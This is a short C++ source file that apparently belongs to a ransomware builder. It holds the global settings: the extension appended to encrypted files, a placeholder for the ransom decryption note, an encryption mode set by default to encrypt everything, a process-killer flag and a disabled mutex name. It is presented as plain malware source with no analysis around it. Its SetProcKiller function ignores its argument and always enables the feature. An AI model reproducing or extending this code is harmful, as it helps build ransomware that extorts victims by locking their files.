#include "global_parameters.h"
#include "api.h"

STATIC WCHAR g_Extention[7] = L".EXTEN";
STATIC CHAR g_DecryptNote[2048] = "__DECRYPT_NOTE__";
STATIC INT g_EncryptMode = ALL_ENCRYPT;
STATIC BOOL g_IsProcKillerEnabled = FALSE;
//STATIC CHAR g_MutexName[65] = "__MUTEX_NAME__";

PWCHAR 
global::GetExtention()
{
	return g_Extention;
}

PCHAR 
global::GetDecryptNote(__in PDWORD pdwDecryptNote)
{
	DWORD dwLength = (DWORD)plstrlenA(g_DecryptNote);
	*pdwDecryptNote = dwLength;
	return g_DecryptNote;

}

PCHAR
global::GetMutexName()
{
	//return g_MutexName;
	return NULL;
}

VOID
global::SetEncryptMode(INT EncryptMode)
{
	g_EncryptMode = EncryptMode;
}

INT
global::GetEncryptMode()
{
	return g_EncryptMode;
}

VOID
global::SetProcKiller(BOOL IsEnabled)
{
	g_IsProcKillerEnabled = TRUE;
}

BOOL 
global::GetProcKiller()
{
	return g_IsProcKillerEnabled;
}